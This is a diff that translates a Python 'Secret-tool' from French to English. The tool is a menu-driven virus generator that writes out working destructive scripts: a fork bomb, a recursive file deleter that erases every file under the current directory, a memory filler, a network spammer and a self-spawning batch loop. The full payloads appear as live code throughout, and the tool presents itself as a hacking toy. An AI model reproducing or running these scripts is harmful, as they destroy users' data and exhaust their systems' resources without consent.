@@ -2,27 +2,27 @@ import os
 import time
 
 def create_fork_bomb():
-    # Crée un fork bomb
+    # Creates a fork bomb
     with open("fork_bomb.py", "w") as f:
         f.write("import os\nwhile True:\n\tos.fork()")
 
 def create_file_deleter():
-    # Crée un virus qui supprime des fichiers
+    # Creates a virus that deletes files
     with open("file_deleter.py", "w") as f:
         f.write("import os\nfor root, dirs, files in os.walk('.'):\n\tfor file in files:\n\t\tos.remove(os.path.join(root, file))")
 
 def create_memory_filler():
-    # Crée un virus qui remplit la mémoire RAM
+    # Creates a virus that fills up RAM
     with open("memory_filler.py", "w") as f:
         f.write("a = []\nwhile True:\n\ta.append(' '*10**6)")
 
 def create_network_spammer():
-    # Crée un virus qui spamme le réseau
+    # Creates a virus that spams the network
     with open("network_spammer.py", "w") as f:
         f.write("import socket\nwhile True:\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(('127.0.0.1', 80))\n\ts.send(b'GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n')")
 
 def create_boot_loop():
-    # Crée un virus qui force une boucle de démarrage
+    # Creates a virus that forces a boot loop
     with open("boot_loop.bat", "w") as f:
         f.write("@echo off\n:start\nstart %0\ngoto start")
 
@@ -35,41 +35,41 @@ def display_menu():
     ███████║███████╗╚██████╗██║  ██║███████╗   ██║   
     ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
     """)
-    print("Bienvenue dans le Secret-tool ! Choisis un virus à créer :")
+    print("Welcome to the Secret-tool! Choose a virus to create:")
     print("1. 🧨 Fork Bomb")
-    print("2. 🗑️ Suppresseur de fichiers")
-    print("3. 🧠 Remplisseur de mémoire RAM")
-    print("4. 🌐 Spammeur réseau")
-    print("5. 🔄 Boucle de démarrage")
-    print("6. 🚪 Quitter")
+    print("2. 🗑️ File Deleter")
+    print("3. 🧠 Memory Filler")
+    print("4. 🌐 Network Spammer")
+    print("5. 🔄 Boot Loop")
+    print("6. 🚪 Exit")
 
 def main():
     while True:
         display_menu()
-        choice = input("Choisis un chiffre (1-6) : ")
+        choice = input("Choose a number (1-6): ")
 
         if choice == "1":
             create_fork_bomb()
-            print("Fork Bomb créé : fork_bomb.py")
+            print("Fork Bomb created: fork_bomb.py")
         elif choice == "2":
             create_file_deleter()
-            print("Suppresseur de fichiers créé : file_deleter.py")
+            print("File Deleter created: file_deleter.py")
         elif choice == "3":
             create_memory_filler()
-            print("Remplisseur de mémoire RAM créé : memory_filler.py")
+            print("Memory Filler created: memory_filler.py")
         elif choice == "4":
             create_network_spammer()
-            print("Spammeur réseau créé : network_spammer.py")
+            print("Network Spammer created: network_spammer.py")
         elif choice == "5":
             create_boot_loop()
-            print("Boucle de démarrage créée : boot_loop.bat")
+            print("Boot Loop created: boot_loop.bat")
         elif choice == "6":
-            print("À plus tard, pirate ! 🏴‍☠️")
+            print("See you later, hacker! 🏴‍☠️")
             break
         else:
-            print("Choix invalide. Essaye encore.")
+            print("Invalid choice. Try again.")
 
-        time.sleep(2)  # Pause pour l'effet dramatique
+        time.sleep(2)  # Pause for dramatic effect
 
 if __name__ == "__main__":
     main()
